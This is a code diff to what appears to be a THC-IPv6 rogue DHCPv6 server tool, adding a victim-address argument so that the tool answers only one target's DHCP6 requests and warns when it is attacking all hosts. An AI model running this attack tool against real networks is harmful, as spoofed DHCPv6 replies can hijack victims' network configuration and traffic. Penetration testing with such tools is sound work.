@@ -22,7 +22,7 @@ void help(char *prg) {
 int main(int argc, char *argv[]) {
   char *routerip, *interface, mac[16] = "";
   char rdatabuf[1024], wdatabuf[1024], cmsgbuf[1024], mybuf[1024];
-  unsigned char *routerip6, *mac6 = mac, *ip6, *ptr, *ptr1, *ptr2, *ptr3;
+  unsigned char *victimip6, *routerip6, *mac6 = mac, *ip6, *ptr, *ptr1, *ptr2, *ptr3;
   unsigned char *dns;
   int size, fromlen = 0, /*mtu = 1500, */ i, j, k, l, m, s, len, t, mlen, csize = 0;
   static struct iovec iov;
@@ -47,14 +47,19 @@ int main(int argc, char *argv[]) {
     fprintf(stderr, "Error: invalid interface %s\n", interface);
     exit(-1);
   }
-  if (argc >= 6 && (ptr = argv[5]) != NULL)
+  if (argc >= 5 && argv[4] != NULL)
+    victimip6 = argv[4];
+  else
+    victimip6 = NULL;
+
+  if (argc >= 7 && (ptr = argv[6]) != NULL)
     sscanf(ptr, "%x:%x:%x:%x:%x:%x", (unsigned int *) &mac[0], (unsigned int *) &mac[1], (unsigned int *) &mac[2], (unsigned int *) &mac[3], (unsigned int *) &mac[4],
            (unsigned int *) &mac[5]);
   else
     mac6 = thc_get_own_mac(interface);
 
-  if (argc >= 5 && argv[4] != NULL)
-    ip6 = thc_resolve6(argv[4]);
+  if (argc >= 6 && argv[5] != NULL)
+    ip6 = thc_resolve6(argv[5]);
   else
     ip6 = thc_get_own_ipv6(interface, NULL, PREFER_LINK);
 
@@ -198,6 +203,15 @@ int main(int argc, char *argv[]) {
         break;
       }
       printf("Received DHCP6 %s packet from %s\n", ptr1, ptr2);
+      if(victimip6 == NULL)
+      	printf("Warning: attacking all IPs, this is not safe\n");
+      else {
+	      if(strcmp(ptr2, victimip6)!=0){
+	      	printf("Packet ignored, not our victim\n");
+	      	free(ptr2);
+	      	continue;
+	      }
+	  }
       free(ptr2);
       if (rdatabuf[0] >= 1 && rdatabuf[0] < 7 && rdatabuf[0] != 2) {
         memset(wdatabuf, 0, sizeof(wdatabuf));
